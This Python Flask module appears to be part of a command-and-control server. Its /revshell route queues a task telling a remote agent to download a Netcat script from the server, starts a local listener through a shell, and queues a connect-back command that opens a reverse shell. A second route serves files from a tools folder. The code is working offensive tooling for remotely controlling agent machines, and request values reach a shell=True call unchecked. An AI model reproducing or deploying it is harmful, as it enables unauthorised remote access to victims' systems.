import json
import uuid
import subprocess
import time
from datetime import datetime, timezone

from flask import Blueprint, request, jsonify, send_from_directory

from config import IP, BASE_DIR, TOOLS_FOLDER
from database import get_db

revshell_bp = Blueprint("revshell", __name__)


@revshell_bp.route("/revshell", methods=["POST"])
def revshell():
    agent_id = request.json.get("agent_id")
    port     = request.json.get("port")
    host_os  = request.json.get("host_os")
    agent_os = request.json.get("agent_os")

    if not port or not agent_id:
        return jsonify({"Error": "Missing Parameters"}), 401

    netcat_url   = f"https://{IP}/tools/Netcat.py"
    task_uuid    = str(uuid.uuid4())
    current_time = datetime.now(timezone.utc)
    db           = get_db()

    # Step 1: send agent the Netcat download
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
        VALUES (?, ?, ?, NULL, ?, NULL)
    """, (task_uuid, agent_id,
          json.dumps({"type": "download", "url": netcat_url}), current_time))
    db.commit()

    # Step 2: open listener on host
    rev_dir     = BASE_DIR / "tools" / "Netcat.py"
    rev_cmd_win = f'py "{rev_dir}" -l -p {port}'
    rev_cmd_lin = f'python3 "{rev_dir}" -l -p {port}'

    host_cmd = (
        f'start cmd /k "{rev_cmd_win}"' if host_os == "windows"
        else f'qterminal -e "{rev_cmd_lin}"'
    )
    subprocess.Popen(host_cmd, shell=True)
    time.sleep(3)

    # Step 3: send agent the connect-back command
    guest_cmd = (
        f"py Netcat.py -t {IP} -p {port}"       if agent_os == "windows"
        else f"python3 Netcat.py -t {IP} -p {port}"
    )
    task_uuid = str(uuid.uuid4())
    db.execute("""
        INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
        VALUES (?, ?, ?, NULL, ?, NULL)
    """, (task_uuid, agent_id,
          json.dumps({"type": "shell", "command": guest_cmd}), current_time))

    db.execute(
        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (str(uuid.uuid4()), datetime.now(timezone.utc),
         "administrator", "Created a new Reverse shell", "Critical", task_uuid)
    )
    db.commit()

    return jsonify({"status": "executed"})


@revshell_bp.route("/tools/<filename>")
def tools_file(filename):
    return send_from_directory(TOOLS_FOLDER, filename)